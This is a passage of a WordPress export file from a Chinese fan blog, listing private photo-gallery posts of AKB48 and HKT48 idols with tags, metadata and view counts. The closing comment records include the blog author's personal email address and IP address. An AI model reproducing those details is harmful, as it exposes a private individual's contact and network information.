		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[1147]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>杂志《WeeklyYoungJump》2014年第26、27期-指原莉乃</title>
		<link>https://www.nervgeek.com/2016/02/21/%e6%9d%82%e5%bf%97%e3%80%8aweeklyyoungjump%e3%80%8b2014%e5%b9%b4%e7%ac%ac26%e3%80%8127%e6%9c%9f-%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83/</link>
		<pubDate>Sun, 21 Feb 2016 05:53:11 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=999</guid>
		<description></description>
		<content:encoded><![CDATA[<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/12-20150919033754.jpg" rel="attachment wp-att-1000"><img class="alignnone size-full wp-image-1000" src="https://www.nervgeek.com/wp-content/uploads/2016/02/12-20150919033754.jpg" alt="12-20150919033754" width="1145" height="1600" /></a>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/14-20150919033755.jpg" rel="attachment wp-att-1001"><img class="alignnone size-full wp-image-1001" src="https://www.nervgeek.com/wp-content/uploads/2016/02/14-20150919033755.jpg" alt="14-20150919033755" width="1071" height="1600" /></a>
<!--more-->
<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/2-20150919033749.jpg" rel="attachment wp-att-1002"><img class="alignnone size-full wp-image-1002" src="https://www.nervgeek.com/wp-content/uploads/2016/02/2-20150919033749.jpg" alt="2-20150919033749" width="1145" height="1600" /></a>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/4-20150919033750.jpg" rel="attachment wp-att-1003"><img class="alignnone size-full wp-image-1003" src="https://www.nervgeek.com/wp-content/uploads/2016/02/4-20150919033750.jpg" alt="4-20150919033750" width="1142" height="1600" /></a>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/5-20150919033750.jpg" rel="attachment wp-att-1004"><img class="alignnone size-full wp-image-1004" src="https://www.nervgeek.com/wp-content/uploads/2016/02/5-20150919033750.jpg" alt="5-20150919033750" width="2299" height="1600" /></a>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/8-20150919033752.jpg" rel="attachment wp-att-1005"><img class="alignnone size-full wp-image-1005" src="https://www.nervgeek.com/wp-content/uploads/2016/02/8-20150919033752.jpg" alt="8-20150919033752" width="2255" height="1600" /></a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>999</wp:post_id>
		<wp:post_date><![CDATA[2016-02-21 13:53:11]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-21 05:53:11]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e6%9d%82%e5%bf%97%e3%80%8aweeklyyoungjump%e3%80%8b2014%e5%b9%b4%e7%ac%ac26%e3%80%8127%e6%9c%9f-%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83]]></wp:post_name>
		<wp:status><![CDATA[private]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="akb"><![CDATA[akb]]></category>
		<category domain="post_tag" nicename="akb48"><![CDATA[akb48]]></category>
		<category domain="post_tag" nicename="akb48g"><![CDATA[akb48g]]></category>
		<category domain="post_tag" nicename="akb48group"><![CDATA[akb48group]]></category>
		<category domain="post_tag" nicename="akbg"><![CDATA[akbg]]></category>
		<category domain="post_tag" nicename="hkt48"><![CDATA[HKT48]]></category>
		<category domain="category" nicename="%e5%86%99%e7%9c%9f"><![CDATA[写真]]></category>
		<category domain="post_tag" nicename="%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83"><![CDATA[指原莉乃]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[1004]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[1039]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>杂志《WeeklyYoungJump》2013年第38、39期-指原莉乃</title>
		<link>https://www.nervgeek.com/2016/02/21/%e6%9d%82%e5%bf%97%e3%80%8aweeklyyoungjump%e3%80%8b2013%e5%b9%b4%e7%ac%ac38%e3%80%8139%e6%9c%9f-%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83/</link>
		<pubDate>Sun, 21 Feb 2016 06:18:38 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1007</guid>
		<description></description>
		<content:encoded><![CDATA[<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/13-20150919031832.jpg" rel="attachment wp-att-1008"><img class="alignnone size-full wp-image-1008" src="https://www.nervgeek.com/wp-content/uploads/2016/02/13-20150919031832.jpg" alt="13-20150919031832" width="1144" height="1600" /></a>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/15-20150919031833.jpg" rel="attachment wp-att-1009"><img class="alignnone size-full wp-image-1009" src="https://www.nervgeek.com/wp-content/uploads/2016/02/15-20150919031833.jpg" alt="15-20150919031833" width="1131" height="1600" /></a>
<!--more-->
<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/1-20150919031824.jpg" rel="attachment wp-att-1010"><img class="alignnone size-full wp-image-1010" src="https://www.nervgeek.com/wp-content/uploads/2016/02/1-20150919031824.jpg" alt="1-20150919031824" width="1143" height="1600" /></a>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/3-20150919031825.jpg" rel="attachment wp-att-1011"><img class="alignnone size-full wp-image-1011" src="https://www.nervgeek.com/wp-content/uploads/2016/02/3-20150919031825.jpg" alt="3-20150919031825" width="1110" height="1600" /></a>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/5-20150919031825.jpg" rel="attachment wp-att-1012"><img class="alignnone size-full wp-image-1012" src="https://www.nervgeek.com/wp-content/uploads/2016/02/5-20150919031825.jpg" alt="5-20150919031825" width="1141" height="1600" /></a>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/7-20150919031827.jpg" rel="attachment wp-att-1013"><img class="alignnone size-full wp-image-1013" src="https://www.nervgeek.com/wp-content/uploads/2016/02/7-20150919031827.jpg" alt="7-20150919031827" width="1125" height="1600" /></a>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/9-20150919031829.jpg" rel="attachment wp-att-1014"><img class="alignnone size-full wp-image-1014" src="https://www.nervgeek.com/wp-content/uploads/2016/02/9-20150919031829.jpg" alt="9-20150919031829" width="1096" height="1600" /></a>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/11-20150919031831.jpg" rel="attachment wp-att-1015"><img class="alignnone size-full wp-image-1015" src="https://www.nervgeek.com/wp-content/uploads/2016/02/11-20150919031831.jpg" alt="11-20150919031831" width="1111" height="1600" /></a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1007</wp:post_id>
		<wp:post_date><![CDATA[2016-02-21 14:18:38]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-21 06:18:38]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e6%9d%82%e5%bf%97%e3%80%8aweeklyyoungjump%e3%80%8b2013%e5%b9%b4%e7%ac%ac38%e3%80%8139%e6%9c%9f-%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83]]></wp:post_name>
		<wp:status><![CDATA[private]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="akb"><![CDATA[akb]]></category>
		<category domain="post_tag" nicename="akb48"><![CDATA[akb48]]></category>
		<category domain="post_tag" nicename="akb48g"><![CDATA[akb48g]]></category>
		<category domain="post_tag" nicename="akb48group"><![CDATA[akb48group]]></category>
		<category domain="post_tag" nicename="akbg"><![CDATA[akbg]]></category>
		<category domain="post_tag" nicename="hkt48"><![CDATA[HKT48]]></category>
		<category domain="category" nicename="%e5%86%99%e7%9c%9f"><![CDATA[写真]]></category>
		<category domain="post_tag" nicename="%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83"><![CDATA[指原莉乃]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[1015]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[344]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>AKB48 43th - 《君はメロディー》 封面</title>
		<link>https://www.nervgeek.com/2016/02/25/akb48-43th-%e3%80%8a%e5%90%9b%e3%81%af%e3%83%a1%e3%83%ad%e3%83%87%e3%82%a3%e3%83%bc%e3%80%8b-%e5%b0%81%e9%9d%a2/</link>
		<pubDate>Thu, 25 Feb 2016 15:38:46 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1056</guid>
		<description></description>
		<content:encoded><![CDATA[<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/W020160215496411855681.jpg" rel="attachment wp-att-1064"><img class="alignnone size-full wp-image-1064" src="https://www.nervgeek.com/wp-content/uploads/2016/02/W020160215496411855681.jpg" alt="W020160215496411855681" width="950" height="950" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/02/W020160215496409269949.jpg" rel="attachment wp-att-1065"><img class="alignnone size-full wp-image-1065" src="https://www.nervgeek.com/wp-content/uploads/2016/02/W020160215496409269949.jpg" alt="W020160215496409269949" width="950" height="950" /></a><!--more-->
<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/W020160215496435129989.jpg" rel="attachment wp-att-1057"><img class="alignnone size-full wp-image-1057" src="https://www.nervgeek.com/wp-content/uploads/2016/02/W020160215496435129989.jpg" alt="W020160215496435129989" width="950" height="950" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/02/W020160215496423577261.jpg" rel="attachment wp-att-1058"><img class="alignnone size-full wp-image-1058" src="https://www.nervgeek.com/wp-content/uploads/2016/02/W020160215496423577261.jpg" alt="W020160215496423577261" width="950" height="950" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/02/W020160215496415584668.jpg" rel="attachment wp-att-1059"><img class="alignnone size-full wp-image-1059" src="https://www.nervgeek.com/wp-content/uploads/2016/02/W020160215496415584668.jpg" alt="W020160215496415584668" width="950" height="950" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/02/W020160215496407724846.jpg" rel="attachment wp-att-1060"><img class="alignnone size-full wp-image-1060" src="https://www.nervgeek.com/wp-content/uploads/2016/02/W020160215496407724846.jpg" alt="W020160215496407724846" width="950" height="950" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/02/W020160215496406052742.jpg" rel="attachment wp-att-1061"><img class="alignnone size-full wp-image-1061" src="https://www.nervgeek.com/wp-content/uploads/2016/02/W020160215496406052742.jpg" alt="W020160215496406052742" width="950" height="950" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/02/W020160215496440458528.jpg" rel="attachment wp-att-1062"><img class="alignnone size-full wp-image-1062" src="https://www.nervgeek.com/wp-content/uploads/2016/02/W020160215496440458528.jpg" alt="W020160215496440458528" width="950" height="534" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/02/W020160215496425950948.jpg" rel="attachment wp-att-1063"><img class="alignnone size-full wp-image-1063" src="https://www.nervgeek.com/wp-content/uploads/2016/02/W020160215496425950948.jpg" alt="W020160215496425950948" width="950" height="950" /></a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1056</wp:post_id>
		<wp:post_date><![CDATA[2016-02-25 23:38:46]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-25 15:38:46]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[akb48-43th-%e3%80%8a%e5%90%9b%e3%81%af%e3%83%a1%e3%83%ad%e3%83%87%e3%82%a3%e3%83%bc%e3%80%8b-%e5%b0%81%e9%9d%a2]]></wp:post_name>
		<wp:status><![CDATA[private]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="43th"><![CDATA[43th]]></category>
		<category domain="post_tag" nicename="akb"><![CDATA[akb]]></category>
		<category domain="post_tag" nicename="akb48"><![CDATA[akb48]]></category>
		<category domain="post_tag" nicename="akb48g"><![CDATA[akb48g]]></category>
		<category domain="post_tag" nicename="akb48group"><![CDATA[akb48group]]></category>
		<category domain="post_tag" nicename="akbg"><![CDATA[akbg]]></category>
		<category domain="post_tag" nicename="cd"><![CDATA[cd]]></category>
		<category domain="post_tag" nicename="hkt48"><![CDATA[HKT48]]></category>
		<category domain="category" nicename="%e5%86%99%e7%9c%9f"><![CDATA[写真]]></category>
		<category domain="post_tag" nicename="%e5%8d%95%e6%9b%b2"><![CDATA[单曲]]></category>
		<category domain="post_tag" nicename="%e5%b0%81%e9%9d%a2"><![CDATA[封面]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[1062]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[898]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>宫脇咲良Google+配图 - No.001</title>
		<link>https://www.nervgeek.com/2016/05/27/%e5%ae%ab%e8%84%87%e5%92%b2%e8%89%afgoogle%e9%85%8d%e5%9b%be-no-001/</link>
		<pubDate>Fri, 27 May 2016 08:53:44 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1248</guid>
		<description></description>
		<content:encoded><![CDATA[<a href="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o3mzbuIq5Y1s96d5ho1_1280.jpg"><img class="alignnone size-full wp-image-1249" src="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o3mzbuIq5Y1s96d5ho1_1280.jpg" alt="tumblr_o3mzbuIq5Y1s96d5ho1_1280" width="1280" height="906" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o5z6ggu0dV1qkb8u8o1_1280.png"><img class="alignnone size-full wp-image-1250" src="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o5z6ggu0dV1qkb8u8o1_1280.png" alt="tumblr_o5z6ggu0dV1qkb8u8o1_1280" width="500" height="600" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o41bkc6EJm1v8vlqeo4_1280.jpg"><img class="alignnone size-full wp-image-1251" src="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o41bkc6EJm1v8vlqeo4_1280.jpg" alt="tumblr_o41bkc6EJm1v8vlqeo4_1280" width="958" height="1280" /></a>
<!--more-->
<a href="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o3mzw9F1pQ1s96d5ho1_1280.jpg"><img class="alignnone size-full wp-image-1252" src="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o3mzw9F1pQ1s96d5ho1_1280.jpg" alt="tumblr_o3mzw9F1pQ1s96d5ho1_1280" width="1280" height="905" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o5083xArHy1v7dt1bo1_1280.jpg"><img class="alignnone size-full wp-image-1253" src="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o5083xArHy1v7dt1bo1_1280.jpg" alt="tumblr_o5083xArHy1v7dt1bo1_1280" width="500" height="412" /></a>
<!--nextpage-->
<a href="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o51kjj1d691v7dt1bo2_1280.jpg"><img class="alignnone size-full wp-image-1254" src="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o51kjj1d691v7dt1bo2_1280.jpg" alt="tumblr_o51kjj1d691v7dt1bo2_1280" width="768" height="1024" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o436fyaivu1riz1uso1_1280.jpg"><img class="alignnone size-full wp-image-1255" src="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o436fyaivu1riz1uso1_1280.jpg" alt="tumblr_o436fyaivu1riz1uso1_1280" width="640" height="852" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o3siayBdN31s96d5ho1_1280.jpg"><img class="alignnone size-full wp-image-1256" src="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o3siayBdN31s96d5ho1_1280.jpg" alt="tumblr_o3siayBdN31s96d5ho1_1280" width="1280" height="904" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o507mcfuGl1v7dt1bo1_1280.jpg"><img class="alignnone size-full wp-image-1257" src="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o507mcfuGl1v7dt1bo1_1280.jpg" alt="tumblr_o507mcfuGl1v7dt1bo1_1280" width="747" height="567" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o45sxrfYuo1up7w0jo4_500.jpg"><img class="alignnone size-full wp-image-1258" src="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o45sxrfYuo1up7w0jo4_500.jpg" alt="tumblr_o45sxrfYuo1up7w0jo4_500" width="498" height="498" /></a>
<!--nextpage-->
<a href="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o45sxrfYuo1up7w0jo3_1280.jpg"><img class="alignnone size-full wp-image-1259" src="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o45sxrfYuo1up7w0jo3_1280.jpg" alt="tumblr_o45sxrfYuo1up7w0jo3_1280" width="498" height="498" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o45sxrfYuo1up7w0jo2_1280.jpg"><img class="alignnone size-full wp-image-1260" src="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o45sxrfYuo1up7w0jo2_1280.jpg" alt="tumblr_o45sxrfYuo1up7w0jo2_1280" width="498" height="498" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o4lttp45WW1up7w0jo1_1280.jpg"><img class="alignnone size-full wp-image-1261" src="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o4lttp45WW1up7w0jo1_1280.jpg" alt="tumblr_o4lttp45WW1up7w0jo1_1280" width="515" height="685" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o4a50bgoAq1qcie37o1_1280.jpg"><img class="alignnone size-full wp-image-1262" src="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o4a50bgoAq1qcie37o1_1280.jpg" alt="tumblr_o4a50bgoAq1qcie37o1_1280" width="600" height="450" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o4nlb1OWOy1up7w0jo1_1280.jpg"><img class="alignnone size-full wp-image-1263" src="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o4nlb1OWOy1up7w0jo1_1280.jpg" alt="tumblr_o4nlb1OWOy1up7w0jo1_1280" width="852" height="640" /></a>
<!--nextpage-->
<a href="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o4v0r1leb91riz1uso1_1280.jpg"><img class="alignnone size-full wp-image-1264" src="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o4v0r1leb91riz1uso1_1280.jpg" alt="tumblr_o4v0r1leb91riz1uso1_1280" width="1280" height="960" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o670bzABNI1riz1uso1_1280.jpg"><img class="alignnone size-full wp-image-1265" src="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o670bzABNI1riz1uso1_1280.jpg" alt="tumblr_o670bzABNI1riz1uso1_1280" width="1280" height="960" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o48qzvhCOs1up7w0jo1_1280.jpg"><img class="alignnone size-full wp-image-1266" src="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o48qzvhCOs1up7w0jo1_1280.jpg" alt="tumblr_o48qzvhCOs1up7w0jo1_1280" width="854" height="641" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o4jugsJNFS1up7w0jo1_1280.jpg"><img class="alignnone size-full wp-image-1267" src="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o4jugsJNFS1up7w0jo1_1280.jpg" alt="tumblr_o4jugsJNFS1up7w0jo1_1280" width="852" height="640" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o4felu2AUr1v7dt1bo9_1280.jpg"><img class="alignnone size-full wp-image-1268" src="https://www.nervgeek.com/wp-content/uploads/2016/05/tumblr_o4felu2AUr1v7dt1bo9_1280.jpg" alt="tumblr_o4felu2AUr1v7dt1bo9_1280" width="1280" height="720" /></a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1248</wp:post_id>
		<wp:post_date><![CDATA[2016-05-27 16:53:44]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-05-27 08:53:44]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%ae%ab%e8%84%87%e5%92%b2%e8%89%afgoogle%e9%85%8d%e5%9b%be-no-001]]></wp:post_name>
		<wp:status><![CDATA[private]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="g"><![CDATA[G+]]></category>
		<category domain="post_tag" nicename="google"><![CDATA[Google+]]></category>
		<category domain="category" nicename="%e5%86%99%e7%9c%9f"><![CDATA[写真]]></category>
		<category domain="post_tag" nicename="%e5%ae%ab%e8%84%87%e5%92%b2%e8%89%af"><![CDATA[宫脇咲良]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[1264]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[1158]]></wp:meta_value>
		</wp:postmeta>
							<wp:comment>
			<wp:comment_id>7</wp:comment_id>
			<wp:comment_author><![CDATA[Mr9esx]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[1138099359@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[113.104.33.91]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2016-05-27 21:03:08]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2016-05-27 13:03:08]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[小樱花~]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>8</wp:comment_id>
			<wp:comment_author><![CDATA[Mr9esx]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[1138099359@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[113.104.33.91]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2016-05-27 21:11:02]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2016-05-27 13:11:02]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[小樱花~]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>7</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>9</wp:comment_id>
			<wp:comment_author><![CDATA[Mr9esx]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[1138099359@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[113.104.33.91]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2016-05-27 21:11:16]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2016-05-27 13:11:16]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[小樱花~]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>8</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>10</wp:comment_id>
			<wp:comment_author><![CDATA[Mr9esx]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[1138099359@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
